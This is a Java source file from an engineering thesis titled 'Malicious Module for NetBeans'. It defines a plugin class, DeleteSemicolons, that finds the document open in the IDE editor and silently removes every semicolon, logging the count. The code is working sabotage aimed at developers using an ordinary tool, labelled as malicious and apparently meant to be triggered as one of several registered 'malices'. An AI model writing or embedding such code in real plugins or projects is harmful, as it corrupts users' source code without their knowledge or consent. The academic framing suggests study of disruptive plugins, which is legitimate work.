/*
 * Gdańsk University of Technology - Engineering Thesis
 * Malicious Module for Netbeans
 *
 * Cilińdź Michał, Gabryelska Nela, Micał Marek
 */
package pl.gda.pg.eti.kio.malicious.entity;

import java.awt.EventQueue;
import javax.swing.JEditorPane;
import javax.swing.text.BadLocationException;
import javax.swing.text.StyledDocument;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.openide.cookies.EditorCookie;
import org.openide.nodes.Node;
import org.openide.windows.TopComponent;
import pl.gda.pg.eti.kio.malicious.annotation.CreatableMalicious;
import pl.gda.pg.eti.kio.malicious.event.MaliciousEvent;

/**
 *
 * @author Marek Micał
 */
@CreatableMalicious(name = "delete_semicolons")
public class DeleteSemicolons extends BaseMalice {

    private final Logger log = LogManager.getLogger(DeleteSemicolons.class);
    private String name = getClass().getSimpleName();

    @Override
    protected void execute(MaliciousEvent event) {

        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    Node[] n = TopComponent.getRegistry().getActivatedNodes();

                    if (n.length == 1) {
                        EditorCookie ec = (EditorCookie) n[0].getLookup().lookup(EditorCookie.class);
                        if (ec != null) {
                            JEditorPane[] panes = ec.getOpenedPanes();
                            if (panes != null && panes.length > 0) {

                                StyledDocument doc = (StyledDocument) panes[0].getDocument();
                                int deletedSemicolons = 0;
                                //Usuwanie średników w otwartym dokumencie
                                try {
                                    for (int i = 0; i < doc.getLength(); i++) {
                                        String s = doc.getText(i, 1);
                                        if (s.equals(";") == true) {
                                            doc.remove(i, 1);
                                            i--;
                                            deletedSemicolons++;
                                        }
                                    }
                                    log.info("Completed: {} - {}", name, "DeleteSemicolons completed successfully. Semicolons deleted: " + deletedSemicolons);

                                } catch (BadLocationException ex) {
                                    if (deletedSemicolons == 0) {
                                        log.error("DeleteSemicolons completed unsuccessfully", ex);
                                    } else {
                                        log.error("DeleteSemicolons completed partially. Semicolons deleted: " + deletedSemicolons, ex);
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ex) {
                    log.error("DeleteSemicolons completed unsuccessfully", ex);
                }
            }
        });


    }
}
